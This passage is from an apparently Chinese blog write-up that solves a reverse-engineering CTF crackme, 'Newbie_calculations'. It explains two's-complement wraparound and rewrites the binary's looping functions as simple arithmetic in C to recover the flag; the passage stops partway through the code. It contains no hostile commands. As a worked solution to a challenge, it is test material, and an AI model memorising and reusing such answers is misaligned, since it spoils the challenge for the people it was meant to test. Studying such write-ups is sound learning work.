title="Newbie_calculations"></a>Newbie_calculations</h3><p>首先从题目看出, 是新手计算, 想到应该和计算有关的. </p><p>题目下载下来, 打开后, 只是打印  <strong>Your flag is:</strong> ,就卡住了, 也没有让输入信息. 在自己写C程序也遇到过这种问题, 应该是程序有什么死循环, 或者大量耗时间的算法.</p><p>载入ida, 找到main函数, 果然有很多函数, 跟进其中一个后发现 v4 = -1, 后面又用来循环, 因为自己补码不是很清楚, 开始只是想到这不是死循环嘛, 且和自己之前的想的一样. 然后天真的认为, 它可能没用, 跳过它, 直接执行后面的或许可以找到答案, 就真的去OD, 打补丁, 程序直接奔溃. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200417124955377-1590549145811-1591952671849.png" alt="image-20200417124955377-1590549145811"></p><p> 这个时候发现有很多函数, 都是一样的, 好像只有3个函数在哪里调用. 但想到麻烦,发现计算和补码相关, 然后自己写简单的程序程序复习了下补码,  <strong>-1-128 = 127, 127+1 = -128;</strong>, 再结合之前看到的补码和时钟原理很像, 自己总结了下, 可以把这个计算想成是一个圆圈, 以一个字节8位来看, 我们知道范围是  <strong>-128 - 127</strong> </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200417131746746-1590549170275-1591952678402.png" alt="image-20200417131746746-1590549170275"></p><p>知道一个周期的大小是 <strong>256</strong>.  那么有 <strong>-1+1= 0</strong> 也可以写成 <strong>-1 - 255 = 0</strong>, 相当于 -1 逆时针转了 一圈少1的距离, 那么就是0的位置, 因为如果转了一圈的话, 回到原位置,. 顺时针加法也是一样的原理, <strong>0 + 256 = 0</strong>;</p><p>知道了这一点, 那么这道题就很容易了.要使 v4 == 0, 那么相当于 v4逆时针旋转一圈少a2的距离, 相当于 v4 += a2,</p><p>那么同样的道理, –*a 经过循环后, 相当于逆时针旋转一圈少a2的距离, 就是 *a1 += a2; 补码真的神奇.😁</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200417133116275-1590549174848-1591952682724.png" alt="image-20200417133116275-1590549174848"></p><p>后面的2个函数同理分析.  将该三个函数分别改写成对应的乘, 减, 加:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401100</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) * b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401220</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) - b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sub_401000</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*a = (*a) + b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v4;</span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v19; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v26; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v27; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v29; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v30; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v31; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v33; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v34; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v35; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v36; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v37; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v38; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v39; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v40; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v41; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v42; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v43; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v44; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v45; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v46; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v47; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v48; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v49; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v50; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v51; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v52; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v53; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v54; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v55; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v56; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v57; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v58; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v59; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v60; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v61; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v62; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v63; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v64; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v65; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v66; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v67; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v68; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v69; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v70; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v71; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v72; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v73; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v74; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v75; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v76; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v77; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v78; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v79; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v80; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v81; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v82; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v83; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v84; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v85; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v86; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v87; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v88; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v89; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v90; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v91; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v92; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v93; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v94; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v95; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v96; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v97; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v98; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v99; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v100; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v101; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v102; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v103; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v104; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v105; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v106; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v107; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v108; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v109; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> *v110; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v111; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v112; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> *v113; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v114; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v115; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> *v116; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v120[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v121; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    v120[i] = <span class="number">1</span>;</span><br><span class="line">  v121 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your flag is:"</span>);</span><br><span class="line">  v3 = sub_401100(v120, <span class="number">1000000000</span>);</span><br><span class="line">  v4 = sub_401220(v3, <span class="number">999999950</span>);</span><br><span class="line">  sub_401100(v4, <span class="number">2</span>);</span><br><span class="line">  v5 = sub_401000(&amp;v120[<span class="number">1</span>], <span class="number">5000000</span>);</span><br><span class="line">  v6 = sub_401220(v5, <span class="number">6666666</span>);</span><br><span class="line">  v7 = sub_401000(v6, <span class="number">1666666</span>);</span><br><span class="line">  v8 = sub_401000(v7, <span class="number">45</span>);</span><br><span class="line">  v9 = sub_401100(v8, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v9, <span class="number">5</span>);</span><br><span class="line">  v10 = sub_401100(&amp;v120[<span class="number">2</span>], <span class="number">1000000000</span>);</span><br><span class="line">  v11 = sub_401220(v10, <span class="number">999999950</span>);</span><br><span class="line">  v12 = sub_401100(v11, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v12, <span class="number">2</span>);</span><br><span class="line">  v13 = sub_401000(&amp;v120[<span class="number">3</span>], <span class="number">55</span>);</span><br><span class="line">  v14 = sub_401220(v13, <span class="number">3</span>);</span><br><span class="line">  v15 = sub_401000(v14, <span class="number">4</span>);</span><br><span class="line">  sub_401220(v15, <span class="number">1</span>);</span><br><span class="line">  v16 = sub_401100(&amp;v120[<span class="number">4</span>], <span class="number">100000000</span>);</span><br><span class="line">  v17 = sub_401220(v16, <span class="number">99999950</span>);</span><br><span class="line">  v18 = sub_401100(v17, <span class="number">2</span>);</span><br><span class="line">  sub_401000(v18, <span class="number">2</span>);</span><br><span class="line">  v19 = sub_401220(&amp;v120[<span class="number">5</span>], <span class="number">1</span>);</span><br><span class="line">  v20 = sub_401100(v19, <span class="number">1000000000</span>);</span><br><span class="line">  v21 = sub_401000(v20, <span class="number">55</span>);</span><br><span class="line">  sub_401220(v21, <span class="number">3</span>);</span><br><span class="line">  v22 = sub_401100(&amp;v120[<span class="number">6</span>], <span class="number">1000000</span>);</span><br><span class="line">  v23 = sub_401220(v22, <span class="number">999975</span>);</span><br><span class="line">  sub_401100(v23, <span class="number">4</span>);</span><br><span class="line">  v24 = sub_401000(&amp;v120[<span class="number">7</span>], <span class="number">55</span>);</span><br><span class="line">  v25 = sub_401220(v24, <span class="number">33</span>);</span><br><span class="line">  v26 = sub_401000(v25, <span class="number">44</span>);</span><br><span class="line">  sub_401220(v26, <span class="number">11</span>);</span><br><span class="line">  v27 = sub_401100(&amp;v120[<span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">  v28 = sub_401220(v27, <span class="number">5</span>);</span><br><span class="line">  v29 = sub_401100(v28, <span class="number">8</span>);</span><br><span class="line">  sub_401000(v29, <span class="number">9</span>);</span><br><span class="line">  v30 = sub_401000(&amp;v120[<span class="number">9</span>], <span class="number">0</span>);</span><br><span class="line">  v31 = sub_401220(v30, <span class="number">0</span>);</span><br><span class="line">  v32 = sub_401000(v31, <span class="number">11</span>);</span><br><span class="line">  v33 = sub_401220(v32, <span class="number">11</span>);</span><br><span class="line">  sub_401000(v33, <span class="number">53</span>);</span><br><span class="line">  v34 = sub_401000(&amp;v120[<span class="number">10</span>], <span class="number">49</span>);</span><br><span class="line">  v35 = sub_401220(v34, <span class="number">2</span>);</span><br><span class="line">  v36 = sub_401000(v35, <span class="number">4</span>);</span><br><span class="line">  sub_401220(v36, <span class="number">2</span>);</span><br><span class="line">  v37 = sub_401100(&amp;v120[<span class="number">11</span>], <span class="number">1000000</span>);</span><br><span class="line">  v38 = sub_401220(v37, <span class="number">999999</span>);</span><br><span class="line">  v39 = sub_401100(v38, <span class="number">4</span>);</span><br><span class="line">  sub_401000(v39, <span class="number">50</span>);</span><br><span class="line">  v40 = sub_401000(&amp;v120[<span class="number">12</span>], <span class="number">1</span>);</span><br><span class="line">  v41 = sub_401000(v40, <span class="number">1</span>);</span><br><span class="line">  v42 = sub_401000(v41, <span class="number">1</span>);</span><br><span class="line">  v43 = sub_401000(v42, <span class="number">1</span>);</span><br><span class="line">  v44 = sub_401000(v43, <span class="number">1</span>);</span><br><span class="line">  v45 = sub_401000(v44, <span class="number">1</span>);</span><br><span class="line">  v46 = sub_401000(v45, <span class="number">10</span>);</span><br><span class="line">  sub_401000(v46, <span class="number">32</span>);</span><br><span class="line">  v47 = sub_401100(&amp;v120[<span class="number">13</span>], <span class="number">10</span>);</span><br><span class="line">  v48 = sub_401220(v47, <span class="number">5</span>);</span><br><span class="line">  v49 = sub_401100(v48, <span class="number">8</span>);</span><br><span class="line">  v50 = sub_401000(v49, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v50, <span class="number">48</span>);</span><br><span class="line">  v51 = sub_401220(&amp;v120[<span class="number">14</span>], <span class="number">1</span>);</span><br><span class="line">  v52 = sub_401100(v51, <span class="number">-294967296</span>);</span><br><span class="line">  v53 = sub_401000(v52, <span class="number">55</span>);</span><br><span class="line">  sub_401220(v53, <span class="number">3</span>);</span><br><span class="line">  v54 = sub_401000(&amp;v120[<span class="number">15</span>], <span class="number">1</span>);</span><br><span class="line">  v55 = sub_401000(v54, <span class="number">2</span>);</span><br><span class="line">  v56 = sub_401000(v55, <span class="number">3</span>);</span><br><span class="line">  v57 = sub_401000(v56, <span class="number">4</span>);</span><br><span class="line">  v58 = sub_401000(v57, <span class="number">5</span>);</span><br><span class="line">  v59 = sub_401000(v58, <span class="number">6</span>);</span><br><span class="line">  v60 = sub_401000(v59, <span class="number">7</span>);</span><br><span class="line">  sub_401000(v60, <span class="number">20</span>);</span><br><span class="line">  v61 = sub_401100(&amp;v120[<span class="number">16</span>], <span class="number">10</span>);</span><br><span class="line">  v62 = sub_401220(v61, <span class="number">5</span>);</span><br><span class="line">  v63 = sub_401100(v62, <span class="number">8</span>);</span><br><span class="line">  v64 = sub_401000(v63, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v64, <span class="number">48</span>);</span><br><span class="line">  v65 = sub_401000(&amp;v120[<span class="number">17</span>], <span class="number">7</span>);</span><br><span class="line">  v66 = sub_401000(v65, <span class="number">6</span>);</span><br><span class="line">  v67 = sub_401000(v66, <span class="number">5</span>);</span><br><span class="line">  v68 = sub_401000(v67, <span class="number">4</span>);</span><br><span class="line">  v69 = sub_401000(v68, <span class="number">3</span>);</span><br><span class="line">  v70 = sub_401000(v69, <span class="number">2</span>);</span><br><span class="line">  v71 = sub_401000(v70, <span class="number">1</span>);</span><br><span class="line">  sub_401000(v71, <span class="number">20</span>);</span><br><span class="line">  v72 = sub_401000(&amp;v120[<span class="number">18</span>], <span class="number">7</span>);</span><br><span class="line">  v73 = sub_401000(v72, <span class="number">2</span>);</span><br><span class="line">  v74 = sub_401000(v73, <span class="number">4</span>);</span><br><span class="line">  v75 = sub_401000(v74, <span class="number">3</span>);</span><br><span class="line">  v76 = sub_401000(v75, <span class="number">6</span>);</span><br><span class="line">  v77 = sub_401000(v76, <span class="number">5</span>);</span><br><span class="line">  v78 = sub_401000(v77, <span class="number">1</span>);</span><br><span class="line">  sub_401000(v78, <span class="number">20</span>);</span><br><span class="line">  v79 = sub_401100(&amp;v120[<span class="number">19</span>], <span class="number">1000000</span>);</span><br><span class="line">  v80 = sub_401220(v79, <span class="number">999999</span>);</span><br><span class="line">  v81 = sub_401100(v80, <span class="number">4</span>);</span><br><span class="line">  v82 = sub_401000(v81, <span class="number">50</span>);</span><br><span class="line">  sub_401220(v82, <span class="number">1</span>);</span><br><span class="line">  v83 = sub_401220(&amp;v120[<span class="number">20</span>], <span class="number">1</span>);</span><br><span class="line">  v84 = sub_401100(v83, <span class="number">-294967296</span>);</span><br><span class="line">  v85 = sub_401000(v84, <span class="number">49</span>);</span><br><span class="line">  sub_401220(v85, <span class="number">1</span>);</span><br><span class="line">  v86 = sub_401220(&amp;v120[<span class="number">21</span>], <span class="number">1</span>);</span><br><span class="line">  v87 = sub_401100(v86, <span class="number">1000000000</span>);</span><br><span class="line">  v88 = sub_401000(v87, <span class="number">54</span>);</span><br><span class="line">  v89 = sub_401220(v88, <span class="number">1</span>);</span><br><span class="line">  v90 = sub_401000(v89, <span class="number">1000000000</span>);</span><br><span class="line">  sub_401220(v90, <span class="number">1000000000</span>);</span><br><span class="line">  v91 = sub_401000(&amp;v120[<span class="number">22</span>], <span class="number">49</span>);</span><br><span class="line">  v92 = sub_401220(v91, <span class="number">1</span>);</span><br><span class="line">  v93 = sub_401000(v92, <span class="number">2</span>);</span><br><span class="line">  sub_401220(v93, <span class="number">1</span>);</span><br><span class="line">  v94 = sub_401100(&amp;v120[<span class="number">23</span>], <span class="number">10</span>);</span><br><span class="line">  v95 = sub_401220(v94, <span class="number">5</span>);</span><br><span class="line">  v96 = sub_401100(v95, <span class="number">8</span>);</span><br><span class="line">  v97 = sub_401000(v96, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v97, <span class="number">48</span>);</span><br><span class="line">  v98 = sub_401000(&amp;v120[<span class="number">24</span>], <span class="number">1</span>);</span><br><span class="line">  v99 = sub_401000(v98, <span class="number">3</span>);</span><br><span class="line">  v100 = sub_401000(v99, <span class="number">3</span>);</span><br><span class="line">  v101 = sub_401000(v100, <span class="number">3</span>);</span><br><span class="line">  v102 = sub_401000(v101, <span class="number">6</span>);</span><br><span class="line">  v103 = sub_401000(v102, <span class="number">6</span>);</span><br><span class="line">  v104 = sub_401000(v103, <span class="number">6</span>);</span><br><span class="line">  sub_401000(v104, <span class="number">20</span>);</span><br><span class="line">  v105 = sub_401000(&amp;v120[<span class="number">25</span>], <span class="number">55</span>);</span><br><span class="line">  v106 = sub_401220(v105, <span class="number">33</span>);</span><br><span class="line">  v107 = sub_401000(v106, <span class="number">44</span>);</span><br><span class="line">  v108 = sub_401220(v107, <span class="number">11</span>);</span><br><span class="line">  